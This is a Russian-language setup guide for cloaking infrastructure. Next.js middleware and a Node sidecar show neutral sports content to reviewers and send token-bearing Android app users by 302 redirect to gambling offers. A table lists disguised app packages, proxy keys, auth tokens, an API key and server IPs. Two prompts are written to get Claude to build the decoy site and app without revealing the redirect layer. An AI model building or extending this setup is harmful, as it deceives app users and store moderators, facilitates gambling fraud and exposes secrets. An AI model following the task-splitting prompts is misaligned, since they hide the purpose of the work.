# Настройка мини-сервера — пошаговый гайд

Как поднять мини-сервер для каждого приложения, подключить middleware для контент-маршрутизации и настроить авторизацию.

---

## Архитектура

Каждое приложение стучится на СВОЙ домен. На домене стоит Next.js сайт со спортивным контентом + middleware. Middleware решает: показать спортивный контент или перенаправить на целевой URL.

```
Приложение → твой-домен.com/path → middleware → бекенд → целевой URL или спортивный контент
```

## Работающие серверы (примеры)

| Приложение | Домен | Path | Сервер |
|---|---|---|---|
| Sisal 3 | asisgameapp.com | /football | 146.190.109.158 |
| Stake (new) | api-stkapp.com | /stake_matches | 152.42.191.74 |
| Betclic (new) | sportsaredsapp.com | /sport_data | 139.59.236.2 |

---

## Быстрый старт (10 минут)

### 1. VPS + Домен

- VPS: Ubuntu 22.04+, 1 vCPU, 512MB RAM, Docker
- Домен: нейтральный (`sport-app-hub.com`, `game-stats.xyz`)
- DNS: A-запись домена → IP VPS

### 2. Склонировать проект

```bash
ssh root@YOUR_VPS_IP
mkdir -p /opt/your-app-hub && cd /opt/your-app-hub
# Скопировать файлы Football Hub проекта
```

### 3. Настроить .env

```bash
cat > .env << 'EOF'
# --- Спортивный контент ---
API_FOOTBALL_KEY=8f0658be5bc18a6cc493005a94c20559
API_FOOTBALL_BASE_URL=https://v3.football.api-sports.io
NEXT_PUBLIC_SITE_URL=https://YOUR-DOMAIN.com
NODE_ENV=production
CACHE_TTL_LIVE_SECONDS=20
CACHE_TTL_STATS_SECONDS=300
CACHE_TTL_STATIC_SECONDS=3600

# --- Маршрутизация контента ---
CLO_BACKEND=https://api.threeamigosteam.com/engine
CLO_PROXY_KEY=pk_YOUR_PROXY_KEY
CLO_SAFE_URL=https://YOUR-DOMAIN.com/YOUR_PATH
CLO_APP_TOKEN=YOUR_AUTH_TOKEN
EOF
```

### 4. Создать middleware

```bash
cat > src/middleware.ts << 'MWEOF'
import { NextRequest, NextResponse } from 'next/server';

const CLO_BACKEND = process.env.CLO_BACKEND || '';
const CLO_PROXY_KEY = process.env.CLO_PROXY_KEY || '';
const CLO_SAFE_URL = process.env.CLO_SAFE_URL || '';
const CLO_APP_TOKEN = process.env.CLO_APP_TOKEN || '';

export async function middleware(request: NextRequest) {
  const { searchParams } = request.nextUrl;
  const appId = searchParams.get('app_id');
  const sid = searchParams.get('sid');

  if (!appId || !CLO_BACKEND || !CLO_PROXY_KEY) {
    return NextResponse.next();
  }

  if (CLO_APP_TOKEN && sid !== CLO_APP_TOKEN) {
    return NextResponse.next();
  }

  try {
    const ip =
      request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
      request.headers.get('x-real-ip') ||
      '0.0.0.0';

    const headers: Record<string, string> = {
      'X-Proxy-Key': CLO_PROXY_KEY,
      'X-Forwarded-For': ip,
      'X-Real-IP': ip,
      'User-Agent': request.headers.get('user-agent') || '',
      'Accept-Language': request.headers.get('accept-language') || '',
    };

    const integrityToken = searchParams.get('integrity_token');
    if (integrityToken) headers['X-Integrity-Token'] = integrityToken;

    const instanceId = searchParams.get('instance_id');
    if (instanceId) headers['X-Instance-Id'] = instanceId;

    const res = await fetch(CLO_BACKEND + '/init', { headers });
    if (!res.ok) return NextResponse.next();

    const data = await res.json();
    const url = data.url;

    if (!url || url === CLO_SAFE_URL) {
      return NextResponse.next();
    }

    return NextResponse.redirect(url, 302);
  } catch {
    return NextResponse.next();
  }
}

export const config = {
  matcher: '/YOUR_PATH',  // <-- заменить на свой path
};
MWEOF
```

### 5. Собрать и запустить

```bash
docker compose up -d --build
```

### 6. Nginx + SSL

```bash
apt install nginx certbot python3-certbot-nginx -y
certbot --nginx -d YOUR-DOMAIN.com
```

### 7. Проверить

```bash
# Без параметров → спортивный контент
curl https://YOUR-DOMAIN.com/YOUR_PATH

# С авторизацией → redirect
curl -v "https://YOUR-DOMAIN.com/YOUR_PATH?app_id=com.package&sid=YOUR_TOKEN"
```

---

## Вариант Б — sidecar (сервер БЕЗ исходников Next / статический сайт)

Если на сервере уже крутится Next.js **standalone-сборка без исходников** или **статический сайт** —
`middleware.ts` добавить нельзя (нужна пересборка из исходников). Тогда ставим лёгкий **Node-sidecar**
перед нужным путём. Логика 1:1 с middleware. Так подняты Betsson (`btsnfitapp.com`) и ViSao (`attlgameapp.com`).

Схема: `nginx /PATH → sidecar :3101 → (SDK-запрос) clo /init → grey: 302 на оффер; white/не-SDK: проксирует на реальную страницу (Next :3000 или внутренний статик :8080)`.

1. `apt install -y nodejs` (Node 20, через nodesource).
2. `/opt/<app>-clo/clo-mw.js` — sidecar (читает query `app_id/sid/integrity_token/instance_id`, гейт `sid===CLO_APP_TOKEN`, зовёт `CLO_BACKEND/init` с `X-Proxy-Key/X-Integrity-Token/X-Instance-Id/X-Forwarded-For`, на grey `302` на url, иначе reverse-proxy на `NEXT_UPSTREAM`). Готовый файл — на серверах Betsson/ViSao (`/opt/betsson-clo/clo-mw.js`).
3. `.env`: `CLO_BACKEND`, `CLO_PROXY_KEY`, `CLO_SAFE_URL`, `CLO_APP_TOKEN`, `NEXT_UPSTREAM`, `PORT=3101`.
4. systemd-юнит `<app>-clo.service` → `enable --now`.
5. Для **статики** добавить внутренний nginx `listen 127.0.0.1:8080; root /var/www/...; absolute_redirect off;` как `NEXT_UPSTREAM` (отдаёт белый лендинг).
6. Публичный nginx: `location /PATH { proxy_pass http://127.0.0.1:3101; }` (+ XFF/Host заголовки).

> ⚠️ Если путь статики редиректит `/page` → `/page/`, ставь `absolute_redirect off` и в APK укажи `path` со слэшем (`/game_total/`), иначе SDK на white получит кривой Location.

---

## Конфигурация для всех приложений

> ⚠️ **Таблица ниже может быть УСТАРЕВШЕЙ** (особенно `Auth Token`). Авторитетный источник ключей по
> прилам клиента — **`APPS_KEYS.md`**. Источник истины по `sid` = `.env CLO_APP_TOKEN` живого мини-сервера.

| # | Приложение | Package | Proxy Key | Auth Token (sid) | Домен | Path |
|---|---|---|---|---|---|---|
| 1 | Betclic Sports | com.mazourbn.jaberbagh | `pk_daf8bde087935e228e4289bfa9155af1` | `r4t7h2v9q6j3` | — | — |
| 2 | Stake | com.CamNangXayNha.ThietKeNhaO | `pk_80fcf5f7a3747824810438f8dd401b82` | `k7m2p9x4w8n3` | — | — |
| 3 | Total Casino | com.ChuaBenhVaThuoc.TuDienThuoc | `pk_fb0509c15d5f71b5c5cce8bad51bddb9` | `a5eee0c5ceb2` | — | — |
| 4 | Snai | com.bft.omniconvert | `pk_57f599aa2e03d2c04d2bcf27c9106c11` | `dc94af77bbaf` | — | — |
| 5 | Goldbet | com.mahzorubhj.nutela | `pk_833588343cefee2a6625c205aeeee9e0` | `2c2831c8b07f` | — | — |
| 6 | Betclic 2 | com.OnTapLop12.SoTayOnTap12 | `pk_fd79bdff36b8104f1e641c53474b9ee8` | `085b140437bb` | — | — |
| 7 | Olimpbet | com.danhbadienthoai.sapxepdanhba | `pk_d1e585f770bbe787a8293f8fcea31298` | `a00996268e7d` | — | — |
| 8 | Sisal | com.CaTruVietNam.NgheThuatCaTru | `pk_5c5733835e9d56dc06ab72fc772347c0` | `f6c316dfac79` | — | — |
| 9 | Olimpbet 2 | com.ThuThuatCasio.CasioThuThuat | `pk_0d329d768aae3a813cc80c9f2e7e5960` | `c43319b24b9e` | — | — |
| 10 | Total Casino 2 | com.AnDamChoBe.AnDam | `pk_b73c9982912f058c461ce42eec4169fa` | `4e293079bca7` | — | — |
| 11 | Betsson | com.XeMay.OnThiLaiXeMayTracNghiem | `pk_8769f7d2341e26a8897b212126a27d53` | `85bed9c88d83` | — | — |
| 12 | Betclic 3 | com.mahzouroubdf.kshk | `pk_7de77afafce0a5eaa3559973f20fdcf3` | `77a7564b1fc7` | — | — |
| 13 | Betsson 2 | com.TracNghiemOTo.OnThiLaiXeOto | `pk_32301f2bab4d6d80ed748179d44782e8` | `a71afa4482a4` | — | — |
| 14 | Sisal 2 | com.pulsecospor.app | `pk_02d384a9a2f2d2fc5cb0f677aea744cf` | `f354d31cc51d` | — | — |
| 15 | Sisal 3 | com.tools.lorenzo.precisionskintool | `pk_2b873b4c86446a29445c051a3a82d018` | `s3f8k2m9x4b7` | asisgameapp.com | /football |
| 16 | Betclic (new) | com.entertainment.fffskintools.getdailyunlimiteddiamonds | `pk_241236f458503fa936e2c97c7b5dec60` | `9c10b3c10e52` | sportsaredsapp.com | /sport_data |
| 17 | Stake (new) | com.muozourube.raqabdob | `pk_aa030def115f0de04f92fade1d7eabbc` | `k7m2p9x4w8n3` | api-stkapp.com | /stake_matches |

> ⚠️ **Stake (new):** APK собран с токеном `k7m2p9x4w8n3` (значение от старого Stake). `CLO_APP_TOKEN` на мини-сервере и `sid` в приложении должны совпадать — здесь это `k7m2p9x4w8n3`. Токен `sid` обязан быть тем же, что зашит в APK; сервер подстраивается под APK, а не наоборот.

---

## Промпт для Claude — создать мини-сервер

Скопируй и вставь в Claude для создания нового мини-сервера:

```
Создай Next.js 15 приложение — спортивный информационный дашборд. Требования:

1. Стек: Next.js 15 App Router + React 19 + TypeScript + Tailwind CSS
2. Данные: API-FOOTBALL v3 (ключ через env API_FOOTBALL_KEY, server-side only)
3. Дизайн: тёмная тема, зелёный/лаймовый акцент, современный UI
4. Функционал:
   - Живые матчи с автообновлением
   - Таблица лиг и турниров
   - Расписание матчей на сегодня с фильтрами
   - Статистика команд и игроков
   - Прогнозы на матчи
5. Деплой: Docker (output: standalone), Nginx reverse proxy, SSL через certbot
6. PWA: manifest.json, service worker для offline, offline page
7. SEO: robots.ts, sitemap.ts, OG image
8. Security headers: X-Content-Type-Options, X-Frame-Options, Referrer-Policy
9. Digital Asset Links: /.well-known/assetlinks.json для Android App Links
10. Путь к приложению: /ТВОЙ_PATH (корень / редиректит туда)

Не добавляй middleware — его я добавлю отдельно.
API-ключ никогда не должен попасть в браузер (нет NEXT_PUBLIC_ префикса).
Все API вызовы через server-side route handlers /api/football/*.
```

## Промпт для Claude — создать Android-приложение

```
Создай Android-приложение (Kotlin, Jetpack Compose, Material 3). Требования:

1. Тема: спортивное приложение (например: тренировки, квизы по спортивным правилам)
2. Архитектура: Clean Architecture (domain/data/presentation), Koin DI
3. Экраны: Splash, Main, Quiz (категории + игра + результат), Training (таймер), Rules, Stats, Settings, Offline
4. Данные: Room DB для прогресса + DataStore для настроек
5. Сеть: при запуске делает один GET-запрос для загрузки контента:

AppClient настройка в Application:
```kotlin
val client = AppClient(
    context = this,
    endpoint = "https://ДОМЕН.com",
    path = "/PATH",
    authToken = "ТОКЕН",
    enableIntegrity = !BuildConfig.DEBUG,
)
```

6. Если resolve() вернул URL → открыть через Chrome Custom Tabs (НЕ WebView)
7. Если resolve() вернул пустую строку → показать нативный offline контент
8. Firebase: Crashlytics + Analytics + FCM push
9. Offline handling: ConnectivityObserver, OfflineHomeScreen
10. Навигация: Jetpack Navigation Compose
11. ProGuard: минимальные правила (только OkHttp dontwarn + enum keep)
12. Permissions: только INTERNET + ACCESS_NETWORK_STATE
13. НЕ использовать: addJavascriptInterface, evaluateJavascript, WebView
14. НЕ собирать: GPU, device codename, build product, installed apps
15. НЕ хардкодить: никаких доменов бекенд-серверов кроме endpoint из AppClient

Файл AppClient.kt приложу отдельно — просто скопируй в проект.
```

---

## Troubleshooting

| Проблема | Решение |
|---|---|
| Docker не билдится | Node.js >= 20 в Dockerfile |
| 502 Bad Gateway | `docker logs container_name` |
| SSL ошибка | `certbot renew` |
| Redirect не работает | Проверить .env: CLO_BACKEND, CLO_PROXY_KEY |
| Всегда спортивный контент | Проверить CLO_APP_TOKEN совпадает с sid (тем, что зашит в APK) |
| Всегда redirect | Проверить CLO_SAFE_URL совпадает с доменом |
| Docker build failed после добавления middleware | Проверить `'use client'` в offline/page.tsx |
| **Поменял `.env`, но ничего не изменилось** | `docker compose restart` НЕ перечитывает `.env`. Нужно пересоздать контейнер: `docker compose down && docker compose up -d` |
| **Клики не долетают в панель** | Проверить, что `sid` из реального APK совпадает с `CLO_APP_TOKEN` (смотреть `grep -oE 'sid=[a-z0-9]+' /var/log/nginx/access.log`). Сервер подстраивается под токен в APK |
